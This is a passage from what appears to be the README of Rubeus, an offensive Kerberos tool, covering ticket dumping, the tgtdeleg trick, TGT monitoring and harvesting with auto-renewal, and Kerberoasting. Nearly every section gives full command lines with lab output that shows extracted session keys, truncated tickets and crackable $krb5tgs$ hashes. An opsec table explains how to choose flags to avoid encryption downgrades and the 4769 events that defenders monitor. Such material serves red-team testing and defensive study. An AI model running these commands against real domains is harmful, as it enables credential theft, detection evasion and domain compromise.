C:\\Rubeus>Rubeus.exe dump\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.4\r\n\r\n\r\n\r\n    [*] Action: Dump Kerberos Ticket Data (Current User)\r\n\r\n    [*] Current LUID    : 0x4420e\r\n\r\n    [*] Returned 3 tickets\r\n\r\n    ServiceName              : krbtgt/TESTLAB.LOCAL\r\n    TargetName               : krbtgt/TESTLAB.LOCAL\r\n    ClientName               : harmj0y\r\n    DomainName               : TESTLAB.LOCAL\r\n    TargetDomainName         : TESTLAB.LOCAL\r\n    AltTargetDomainName      : TESTLAB.LOCAL\r\n    SessionKeyType           : rc4_hmac\r\n    Base64SessionKey         : AAAAAAAAAAAAAAAAAAAAAA==\r\n    KeyExpirationTime        : 12/31/1600 4:00:00 PM\r\n    TicketFlags              : name_canonicalize, pre_authent, renewable, forwarded, forwardable\r\n    StartTime                : 2/11/2019 3:19:15 PM\r\n    EndTime                  : 2/11/2019 8:19:13 PM\r\n    RenewUntil               : 2/18/2019 3:19:13 PM\r\n    TimeSkew                 : 0\r\n    EncodedTicketSize        : 1306\r\n    Base64EncodedTicket      :\r\n\r\n        doIFFjCCBRKgAwIBBaEDAgEWoo...(snip)...\r\n\r\n    ...(snip)...\r\n\r\n\r\n\r\n    [*] Enumerated 3 total tickets\r\n    [*] Extracted  3 total tickets\r\n\r\n\r\n**Elevated** extraction of tickets from a specific logon session:\r\n\r\n    C:\\Rubeus>Rubeus.exe dump /luid:0x47869cc\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n\r\n    [*] Action: Dump Kerberos Ticket Data (All Users)\r\n\r\n    [*] Target LUID: 0x47869cc\r\n\r\n    UserName                 : harmj0y\r\n    Domain                   : TESTLAB\r\n    LogonId                  : 0x47869cc\r\n    UserSID                  : S-1-5-21-883232822-274137685-4173207997-1111\r\n    AuthenticationPackage    : Negotiate\r\n    LogonType                : Interactive\r\n    LogonTime                : 2/11/2019 11:05:31 PM\r\n    LogonServer              : PRIMARY\r\n    LogonServerDNSDomain     : TESTLAB.LOCAL\r\n    UserPrincipalName        : harmj0y@testlab.local\r\n\r\n        [*] Enumerated 3 ticket(s):\r\n\r\n        ServiceName              : krbtgt/TESTLAB.LOCAL\r\n        TargetName               : krbtgt/TESTLAB.LOCAL\r\n        ClientName               : harmj0y\r\n        DomainName               : TESTLAB.LOCAL\r\n        TargetDomainName         : TESTLAB.LOCAL\r\n        AltTargetDomainName      : TESTLAB.LOCAL\r\n        SessionKeyType           : rc4_hmac\r\n        Base64SessionKey         : u9DOCzuGKAZB6h/E/9XcFg==\r\n        KeyExpirationTime        : 12/31/1600 4:00:00 PM\r\n        TicketFlags              : name_canonicalize, pre_authent, renewable, forwarded, forwardable\r\n        StartTime                : 2/11/2019 3:21:53 PM\r\n        EndTime                  : 2/11/2019 8:19:13 PM\r\n        RenewUntil               : 2/18/2019 3:19:13 PM\r\n        TimeSkew                 : 0\r\n        EncodedTicketSize        : 1306\r\n        Base64EncodedTicket      :\r\n\r\n        doIFFjCCBRKgAwIBBaEDAgEWoo...(snip)...\r\n\r\n        ServiceName              : krbtgt/TESTLAB.LOCAL\r\n        TargetName               : krbtgt/TESTLAB.LOCAL\r\n        ClientName               : harmj0y\r\n        DomainName               : TESTLAB.LOCAL\r\n        TargetDomainName         : TESTLAB.LOCAL\r\n        AltTargetDomainName      : TESTLAB.LOCAL\r\n        SessionKeyType           : aes256_cts_hmac_sha1\r\n        Base64SessionKey         : tKcszT8rdYyxBxBHlkpmJ/SEsfON8mBMs4ZN/29Xv8A=\r\n        KeyExpirationTime        : 12/31/1600 4:00:00 PM\r\n        TicketFlags              : name_canonicalize, pre_authent, initial, renewable, forwardable\r\n        StartTime                : 2/11/2019 3:19:13 PM\r\n        EndTime                  : 2/11/2019 8:19:13 PM\r\n        RenewUntil               : 2/18/2019 3:19:13 PM\r\n        TimeSkew                 : 0\r\n        EncodedTicketSize        : 1338\r\n        Base64EncodedTicket      :\r\n\r\n        doIFNjCCBTKgAwIBBaEDAgEWoo...(snip)...\r\n\r\n        ...(snip)...\r\n\r\n\r\n    [*] Enumerated 3 total tickets\r\n    [*] Extracted  3 total tickets\r\n\r\n\r\n**Elevated** extraction of all TGTs on a system:\r\n\r\n    C:\\Rubeus>Rubeus.exe dump /service:krbtgt\r\n\r\n     ______        _                      \r\n    (_____ \\      | |                     \r\n     _____) )_   _| |__  _____ _   _  ___ \r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n\r\n    [*] Action: Dump Kerberos Ticket Data (All Users)\r\n\r\n    [*] Target service  : krbtgt\r\n\r\n\r\n    UserName                 : harmj0y\r\n    Domain                   : TESTLAB\r\n    LogonId                  : 0x47869cc\r\n    UserSID                  : S-1-5-21-883232822-274137685-4173207997-1111\r\n    AuthenticationPackage    : Negotiate\r\n    LogonType                : Interactive\r\n    LogonTime                : 2/11/2019 11:05:31 PM\r\n    LogonServer              : PRIMARY\r\n    LogonServerDNSDomain     : TESTLAB.LOCAL\r\n    UserPrincipalName        : harmj0y@testlab.local\r\n\r\n        [*] Enumerated 3 ticket(s):\r\n\r\n        ServiceName              : krbtgt/TESTLAB.LOCAL\r\n        TargetName               : krbtgt/TESTLAB.LOCAL\r\n        ClientName               : harmj0y\r\n        DomainName               : TESTLAB.LOCAL\r\n        TargetDomainName         : TESTLAB.LOCAL\r\n        AltTargetDomainName      : TESTLAB.LOCAL\r\n        SessionKeyType           : rc4_hmac\r\n        Base64SessionKey         : y4LL+W3KZoOjnwsiwf150g==\r\n        KeyExpirationTime        : 12/31/1600 4:00:00 PM\r\n        TicketFlags              : name_canonicalize, pre_authent, renewable, forwarded, forwardable\r\n        StartTime                : 2/11/2019 3:23:50 PM\r\n        EndTime                  : 2/11/2019 8:19:13 PM\r\n        RenewUntil               : 2/18/2019 3:19:13 PM\r\n        TimeSkew                 : 0\r\n        EncodedTicketSize        : 1306\r\n        Base64EncodedTicket      :\r\n\r\n        doIFFjCCBRKgAwIBBaEDAgEWoo...(snip)...\r\n\r\n        ...(snip)...\r\n\r\n    UserName                 : WINDOWS10$\r\n    Domain                   : TESTLAB\r\n    LogonId                  : 0x3e4\r\n    UserSID                  : S-1-5-20\r\n    AuthenticationPackage    : Negotiate\r\n    LogonType                : Service\r\n    LogonTime                : 2/7/2019 4:51:20 PM\r\n    LogonServer              : \r\n    LogonServerDNSDomain     : testlab.local\r\n    UserPrincipalName        : WINDOWS10$@testlab.local\r\n\r\n        [*] Enumerated 4 ticket(s):\r\n\r\n        ServiceName              : krbtgt/TESTLAB.LOCAL\r\n        TargetName               : krbtgt/TESTLAB.LOCAL\r\n        ClientName               : WINDOWS10$\r\n        DomainName               : TESTLAB.LOCAL\r\n        TargetDomainName         : TESTLAB.LOCAL\r\n        AltTargetDomainName      : TESTLAB.LOCAL\r\n        SessionKeyType           : rc4_hmac\r\n        Base64SessionKey         : 0NgsSyZ/XOCTi9wLR1z9Kg==\r\n        KeyExpirationTime        : 12/31/1600 4:00:00 PM\r\n        TicketFlags              : name_canonicalize, pre_authent, renewable, forwarded, forwardable\r\n        StartTime                : 2/11/2019 3:23:50 PM\r\n        EndTime                  : 2/11/2019 7:23:48 PM\r\n        RenewUntil               : 2/18/2019 2:23:48 PM\r\n        TimeSkew                 : 0\r\n        EncodedTicketSize        : 1304\r\n        Base64EncodedTicket      :\r\n\r\n        doIFFDCCBRCgAwIBBaEDAgEWoo...(snip)...\r\n\r\n        ...(snip)...\r\n\r\n\r\n    [*] Enumerated 20 total tickets\r\n    [*] Extracted  9 total tickets\r\n\r\n\r\n### tgtdeleg\r\n\r\nThe **tgtdeleg** using [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) trick (**tgt::deleg**) that abuses the Kerberos GSS-API to retrieve a usable TGT for the current user without needing elevation on the host. AcquireCredentialsHandle() is used to get a handle to the current user's Kerberos security credentials, and InitializeSecurityContext() with the ISC_REQ_DELEGATE flag and a target SPN of HOST/DC.domain.com to prepare a fake delegate context to send to the DC. This results in an AP-REQ in the GSS-API output that contains a KRB_CRED in the authenticator checksum. The service ticket session key is extracted from the local Kerberos cache and is used to decrypt the KRB_CRED in the authenticator, resulting in a usable TGT .kirbi.\r\n\r\nIf automatic target/domain extraction is failing, a known SPN of a service configured with unconstrained delegation can be specified with `/target:SPN`.\r\n\r\n    C:\\Rubeus>Rubeus.exe tgtdeleg\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n    [*] Action: Request Fake Delegation TGT (current user)\r\n\r\n    [*] No target SPN specified, attempting to build 'HOST/dc.domain.com'\r\n    [*] Initializing Kerberos GSS-API w/ fake delegation for target 'HOST/PRIMARY.testlab.local'\r\n    [+] Kerberos GSS-API initialization success!\r\n    [+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.\r\n    [*] Found the AP-REQ delegation ticket in the GSS-API output.\r\n    [*] Authenticator etype: aes256_cts_hmac_sha1\r\n    [*] Extracted the service ticket session key from the ticket cache: YnEFxPfqw3LdfNvLtdFfzaFf7zG3hG+HNjesy+6R+ys=\r\n    [+] Successfully decrypted the authenticator\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIFNjCCBTKgAwIBBaEDAgEWoo...(snip)...\r\n\r\n\r\n### monitor\r\n\r\nThe **monitor** action will periodically extract all TGTs every `/monitorinterval:X` seconds (default of 60) and display any newly captured TGTs. A `/targetuser:USER` can be specified, returning only ticket data for said user. This function is especially useful on servers with unconstrained delegation enabled ;)\r\n\r\nWhen the `/targetuser:USER` (or if not specified, any user) creates a new 4624 logon event, any extracted TGT KRB-CRED data is output.\r\n\r\nThe `/nowrap` flag causes the base64 encoded ticket output to no wrap per line.\r\n\r\nIf you want **monitor** to run for a specific period of time, use `/runfor:SECONDS`.\r\n\r\nFurther, if you wish to save the output to the registry, pass the `/registry` flag and specfiy a path under HKLM to create (e.g., `/registry:SOFTWARE\\MONITOR`). Then you can remove this entry after you've finished running Rubeus by `Get-Item HKLM:\\SOFTWARE\\MONITOR\\ | Remove-Item -Recurse -Force`.\r\n\r\n    c:\\Rubeus>Rubeus.exe monitor /targetuser:DC$ /interval:10\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v1.5.0\r\n\r\n    [*] Action: TGT Monitoring\r\n    [*] Target user     : DC$\r\n    [*] Monitoring every 10 seconds for new TGTs\r\n\r\n\r\n    [*] 12/21/2019 11:10:16 PM UTC - Found new TGT:\r\n\r\n      User                  :  DC$@THESHIRE.LOCAL\r\n      StartTime             :  12/21/2019 2:44:31 PM\r\n      EndTime               :  12/21/2019 3:44:31 PM\r\n      RenewTill             :  12/28/2019 2:13:06 PM\r\n      Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable\r\n      Base64EncodedTicket   :\r\n\r\n        doIFFDCCBRCgAwIBBaEDAgEWoo...(snip)...\r\n\r\n    [*] Ticket cache size: 1\r\n\r\n\r\n**Note that this action needs to be run from an elevated context!**\r\n\r\n\r\n### harvest\r\n\r\nThe **harvest** action takes [monitor](#monitor) one step further. It periodically extract all TGTs every `/monitorinterval:X` seconds (default of 60), extracts any new TGT KRB-CRED files, and keeps a cache of any extracted TGTs. Every interval, any TGTs that will expire before the next interval are automatically renewed (up until their renewal limit). Every `/displayinterval:X` seconds (default of 1200) and the current cache of \"usable\"/valid TGT KRB-CRED .kirbis are output as base64 blobs.\r\n\r\nThis allows you to harvest usable TGTs from a system without opening up a read handle to LSASS, though elevated rights are needed to extract the tickets.\r\n\r\nThe `/nowrap` flag causes the base64 encoded ticket output to no wrap per line.\r\n\r\nIf you want **harvest** to run for a specific period of time, use `/runfor:SECONDS`.\r\n\r\nFurther, if you wish to save the output to the registry, pass the `/registry` flag and specfiy a path under HKLM to create (e.g., `/registry:SOFTWARE\\MONITOR`). Then you can remove this entry after you've finished running Rubeus by `Get-Item HKLM:\\SOFTWARE\\MONITOR\\ | Remove-Item -Recurse -Force`.\r\n\r\n    c:\\Rubeus>Rubeus.exe harvest /interval:30\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v0.0.1a\r\n\r\n    [*] Action: TGT Harvesting (w/ auto-renewal)\r\n\r\n    [*] Monitoring every 30 minutes for 4624 logon events\r\n\r\n    ...(snip)...\r\n\r\n    [*] Renewing TGT for dfm.a@TESTLAB.LOCAL\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 1520 bytes\r\n    [*] Received 1549 bytes\r\n\r\n    [*] 9/17/2018 6:43:02 AM - Current usable TGTs:\r\n\r\n    User                  :  dfm.a@TESTLAB.LOCAL\r\n    StartTime             :  9/17/2018 6:43:02 AM\r\n    EndTime               :  9/17/2018 11:43:02 AM\r\n    RenewTill             :  9/24/2018 2:07:48 AM\r\n    Flags                 :  name_canonicalize, renewable, forwarded, forwardable\r\n    Base64EncodedTicket   :\r\n\r\n        doIFujCCBbagAw...(snip)...\r\n\r\n**Note that this action needs to be run from an elevated context!**\r\n\r\n\r\n## Roasting\r\n\r\nBreakdown of the roasting commands:\r\n\r\n| Command     | Description |\r\n| ----------- | ----------- |\r\n| [kerberoast](#kerberoast) | Perform Kerberoasting against all (or specified) users |\r\n| [asreproast](#asreproast) | Perform AS-REP roasting against all (or specified) users |\r\n\r\n\r\n### kerberoast\r\n\r\nThe **kerberoast** action replaces the [SharpRoast](https://github.com/GhostPack/SharpRoast) project's functionality. Like SharpRoast, this action uses the [KerberosRequestorSecurityToken.GetRequest Method()](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx) method that was contributed to PowerView by [@machosec](https://twitter.com/machosec) in order to request the proper service ticket (for default behavior, [opsec table](#kerberoasting-opsec) for more detail). Unlike SharpRoast, this action now performs proper ASN.1 parsing of the result structures.\r\n\r\nWith no other arguments, all user accounts with SPNs set in the current domain are Kerberoasted, _requesting their highest supported encryption type_ (see the [opsec table](#kerberoasting-opsec)). The `/spn:X` argument roasts just the specified SPN, the `/user:X` argument roasts just the specified user, and the `/ou:X` argument roasts just users in the specific OU. The `/domain` and `/dc` arguments are optional, pulling system defaults as other actions do.\r\n\r\nThe `/stats` flag will output statistics about kerberoastable users found, including a breakdown of supported encryption types and years user passwords were last set. This flag can be combined with other targeting options.\r\n\r\nThe `/outfile:FILE` argument outputs roasted hashes to the specified file, one per line.\r\n\r\nIf the `/simple` flag is specified, roasted hashes will be output to the console, one per line.\r\n\r\nIf the `/nowrap` flag is specified, Kerberoast results will not be line-wrapped.\r\n\r\nIf the the TGT `/ticket:X` supplied (base64 encoding of a .kirbi file or the path to a .kirbi file on disk) that TGT is used to request the service service tickets during roasting. If `/ticket:X` is used with `/spn:Y` or `/spns:Y` (`/spns:` can be a file containing each SPN on a new line or a comma separated list) then no LDAP searching happens for users, so it can be done from a non-domain joined system in conjunction with `/dc:Z`.\r\n\r\nIf the `/tgtdeleg` flag is supplied, the [tgtdeleg](#tgtdeleg) trick it used to get a usable TGT for the current user, which is then used for the roasting requests. If this flag is used, accounts with AES enabled in **msDS-SupportedEncryptionTypes** will have RC4 tickets requested.\r\n\r\nIf the `/aes` flag is supplied, accounts with AES encryption enabled in **msDS-SupportedEncryptionTypes** are enumerated and AES service tickets are requested.\r\n\r\nIf the `/ldapfilter:X` argument is supplied, the supplied LDAP filter will be added to the final LDAP query used to find Kerberoastable users.\r\n\r\nIf the `/rc4opsec` flag is specified, the **tgtdeleg** trick is used, and accounts **without** AES enabled are enumerated and roasted.\r\n\r\nIf you want to use alternate domain credentials for Kerberoasting (and searching for users to Kerberoast), they can be specified with `/creduser:DOMAIN.FQDN\\USER /credpassword:PASSWORD`.\r\n\r\nIf the `/pwdsetafter:MM-dd-yyyy` argument is supplied, only accounts whose password was last changed after MM-dd-yyyy will be enumerated and roasted.\r\n\r\nIf the `/pwdsetbefore:MM-dd-yyyy` argument is supplied, only accounts whose password was last changed before MM-dd-yyyy will be enumerated and roasted.\r\n\r\nIf the `/resultlimit:NUMBER` argument is specified, the number of accounts that will be enumerated and roasted is limited to NUMBER.\r\n\r\nIf the `/delay:MILLISECONDS` argument is specified, that number of milliseconds is paused between TGS requests. The `/jitter:1-100` flag can be combined for a % jitter.\r\n\r\nIf the `/enterprise` flag is used, the spn is assumed to be an enterprise principal (i.e. *user@domain.com*). This flag only works when kerberoasting with a TGT.\r\n\r\nIf the `/autoenterprise` flag is used, if roasting an SPN fails (due to an invalid or duplicate SPN) Rubeus will automatically retry using the enterprise principal. This is only useful when `/spn` or `/spns` is *not* supplied as Rubeus needs to know the target accounts samaccountname, which it gets when querying LDAP for the account information.\r\n\r\nIf the `/ldaps` flag is used, any LDAP queries will go over TLS (port 636).\r\n\r\nIf the `/nopreauth:USER` argument is used, either the `/spn:Y` or `/spns:Y` argument is required. The `/nopreauth:USER` argument will attempt to send AS-REQ's with the service being those passed in `/spn:Y` or `/spns:Y` to request service tickets.\r\n\r\n\r\n#### kerberoasting opsec\r\n\r\nHere is a table comparing the behavior of various flags from an opsec perspective:\r\n\r\n| Arguments     | Description |\r\n| ----------- | ----------- |\r\n| **none** | Use KerberosRequestorSecurityToken roasting method, roast w/ highest supported encryption |\r\n| **/tgtdeleg** | Use the **tgtdeleg** trick to perform TGS-REQ requests of RC4-enabled accounts, roast all accounts w/ RC4 specified |\r\n| **/ticket:X** | Use the supplied TGT blob/file for TGS-REQ requests, roast all accounts w/ RC4 specified |\r\n| **/rc4opsec** | Use the **tgtdeleg** trick, enumerate accounts _without_ AES enabled, roast w/ RC4 specified |\r\n| **/aes** | Enumerate accounts with AES enabled, use KerberosRequestorSecurityToken roasting method, roast w/ highest supported encryption |\r\n| **/aes /tgtdeleg** | Use the **tgtdeleg** trick, enumerate accounts with AES enabled, roast w/ AES specified |\r\n| **/pwdsetafter:X** | Use the supplied date and only enumerate accounts with password last changed after that date |\r\n| **/pwdsetbefore:X** | Use the supplied date and only enumerate accounts with password last changed before that date |\r\n| **/resultlimit:X** | Use the specified number to limit the accounts that will be roasted |\r\n| **/nopreauth:USER** | Will send AS-REQ's rather than TGS-REQ's which results in 4768 events instead of the 4769 frequently monitored for kerberoasting detections |\r\n\r\n#### Examples\r\n\r\nKerberoasting all users in the current domain using the default `KerberosRequestorSecurityToken.GetRequest` method:\r\n\r\n    C:\\Rubeus>Rubeus.exe kerberoast\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.4\r\n\r\n\r\n    [*] Action: Kerberoasting\r\n\r\n\r\n    [*] SamAccountName         : harmj0y\r\n    [*] DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local\r\n    [*] ServicePrincipalName   : asdf/asdfasdf\r\n    [*] Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$AE5F019D4CDED6CD74830CC...(snip)...\r\n\r\n\r\n    [*] SamAccountName         : sqlservice\r\n    [*] DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local\r\n    [*] ServicePrincipalName   : MSSQLSvc/SQL.testlab.local\r\n    [*] Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.testlab.local*$E2B3869290...(snip)...\r\n    \r\n    ...(snip)...\r\n\r\n\r\nKerberoasting all users in a specific OU, saving the hashes to an output file:\r\n\r\n    C:\\Rubeus>Rubeus.exe kerberoast /ou:OU=TestingOU,DC=testlab,DC=local /outfile:C:\\Temp\\hashes.txt\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.4\r\n\r\n\r\n    [*] Action: Kerberoasting\r\n\r\n    [*] Target OU              : OU=TestingOU,DC=testlab,DC=local\r\n\r\n    [*] SamAccountName         : testuser2\r\n    [*] DistinguishedName      : CN=testuser2,OU=TestingOU,DC=testlab,DC=local\r\n    [*] ServicePrincipalName   : service/host\r\n    [*] Hash written to C:\\Temp\\hashes.txt\r\n\r\n    [*] Roasted hashes written to : C:\\Temp\\hashes.txt\r\n\r\n\r\nPerform Kerberoasting using the `tgtdeleg` trick to get a usable TGT, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 3 service tickets:\r\n\r\n    C:\\Rubeus>Rubeus.exe kerberoast /tgtdeleg /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:3\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v1.5.0\r\n\r\n\r\n    [*] Action: Kerberoasting\r\n\r\n    [*] Using 'tgtdeleg' to request a TGT for the current user\r\n    [*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else\r\n    [*] Searching the current domain for Kerberoastable users\r\n    [*] Searching for accounts with lastpwdset from 01-31-2005 to 03-29-2010\r\n    [*] Up to 3 result(s) will be returned\r\n\r\n    [*] Total kerberoastable users : 3\r\n\r\n\r\n    [*] SamAccountName         : harmj0y\r\n    [*] DistinguishedName      : CN=harmj0y,OU=TestOU,DC=theshire,DC=local\r\n    [*] ServicePrincipalName   : testspn/server\r\n    [*] PwdLastSet             : 5/31/2008 12:00:02 AM\r\n    [*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96\r\n    [*] Hash                   : $krb5tgs$23$*harmj0y$theshire.local$testspn/server*$F6EEFE5026CF8F02E3DC...(snip)...\r\n\r\n\r\n    [*] SamAccountName         : constraineduser\r\n    [*] DistinguishedName      : CN=constraineduser,CN=Users,DC=theshire,DC=local\r\n    [*] ServicePrincipalName   : blah/blah123\r\n    [*] PwdLastSet             : 9/5/2009 7:48:50 PM\r\n    [*] Supported ETypes       : RC4_HMAC\r\n    [*] Hash                   : $krb5tgs$23$*constraineduser$theshire.local$blah/blah123*$6F0992C377AA12...(snip)...\r\n\r\n\r\n    [*] SamAccountName         : newuser\r\n    [*] DistinguishedName      : CN=newuser,CN=Users,DC=theshire,DC=local\r\n    [*] ServicePrincipalName   : blah/blah123456\r\n    [*] PwdLastSet             : 9/12/2008 8:05:16 PM\r\n    [*] Supported ETypes       : RC4_HMAC, AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96\r\n    [*] Hash                   : $krb5tgs$23$*newuser$theshire.local$blah/blah123456*$C4561559C2A7DF07712...(snip)...\r\n\r\n\r\nList statistics about found Kerberoastable accounts without actually sending ticket requests:\r\n\r\n    C:\\Rubeus>Rubeus.exe kerberoast /stats\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v1.5.0\r\n\r\n\r\n    [*] Action: Kerberoasting\r\n\r\n    [*] Listing statistics about target users, no ticket requests being performed.\r\n    [*] Searching the current domain for Kerberoastable users\r\n\r\n    [*] Total kerberoastable users : 4\r\n\r\n\r\n     ----------------------------------------------------------------------\r\n     | Supported Encryption Type                                  | Count |\r\n     ----------------------------------------------------------------------\r\n     | RC4_HMAC_DEFAULT                                           | 1     |\r\n     | RC4_HMAC                                                   | 1     |\r\n     | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96           | 1     |\r\n     | RC4_HMAC, AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 1     |\r\n     ----------------------------------------------------------------------\r\n\r\n     ----------------------------------\r\n     | Password Last Set Year | Count |\r\n     ----------------------------------\r\n     | 2019                   | 4     |\r\n     ----------------------------------\r\n\r\n\r\nKerberoasting a specific user, with simplified hash output:\r\n\r\n    C:\\Rubeus>Rubeus.exe kerberoast /user:harmj0y /simple\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v1.5.0\r\n\r\n\r\n    [*] Action: Kerberoasting\r\n\r\n    [*] NOTICE: AES hashes will be returned for AES-enabled accounts.\r\n    [*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\r\n\r\n    [*] Target User            : harmj0y\r\n    [*] Searching the current domain for Kerberoastable users\r\n\r\n    [*] Total kerberoastable users : 1\r\n\r\n    $krb5tgs$18$*harmj0y$theshire.local$testspn/server*$F63783C58AA153F24DFCC796A120C55C$06C6929374A2D3...(snip)...\r\n\r\n\r\nKerberoasting all users in a foreign _trusting_ domain, not line-wrapping the results:\r\n\r\n    C:\\Rubeus>Rubeus.exe kerberoast /domain:dev.testlab.local /nowrap\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.5.0\r\n\r\n\r\n    [*] Action: Kerberoasting\r\n\r\n    [*] Target Domain          : dev.testlab.local\r\n\r\n    [*] SamAccountName         : jason\r\n    [*] DistinguishedName      : CN=jason,CN=Users,DC=dev,DC=testlab,DC=local\r\n    [*] ServicePrincipalName   : test/test\r\n    [*] Hash                   : $krb5tgs$23$*$dev.testlab.local$test/test@dev.testlab.local*$969339A82...(snip)...\r\n\r\n\r\nKerberoasting using an existing TGT:\r\n\r\n    C:\\Rubeus>Rubeus.exe kerberoast /ticket:doIFujCCBbagAwIBBaEDAgEWoo...(snip)... /spn:\"asdf/asdfasdf\" /dc:primary.testlab.local\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.5\r\n\r\n\r\n    [*] Action: Kerberoasting\r\n\r\n    [*] Using a TGT /ticket to request service tickets\r\n\r\n    [*] Target SPN             : asdf/asdfasdf\r\n    [*] Hash                   : $krb5tgs$23$*USER$DOMAIN$asdf/asdfasdf*$4EFF99FDED690AB4616EB...(snip)...\r\n\r\n\r\n\"Opsec\" Kerberoasting, using the **tgtdeleg** trick, filtering out AES-enabled accounts:\r\n\r\n    C:\\Rubeus>Rubeus.exe kerberoast /rc4opsec\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.6\r\n\r\n\r\n    [*] Action: Kerberoasting\r\n\r\n    [*] Using 'tgtdeleg' to request a TGT for the current user\r\n    [*] Searching the current domain for Kerberoastable users\r\n    [*] Searching for accounts that only support RC4_HMAC, no AES\r\n\r\n    [*] Found 6 users to Kerberoast!\r\n\r\n    [*] SamAccountName         : harmj0y\r\n    [*] DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local\r\n    [*] ServicePrincipalName   : asdf/asdfasdf\r\n    [*] Supported ETypes       : RC4_HMAC_DEFAULT\r\n    [*] Hash                   : $krb5tgs$23$*harmj0y$testlab.local$asdf/asdfasdf*$6B4AD4B61D37D54...(snip)...\r\n\r\n\r\n### asreproast\r\n\r\nThe **asreproast** action replaces the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast/) project which executed similar actions with the (larger sized) [BouncyCastle](https://www.bouncycastle.org/) library. If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully 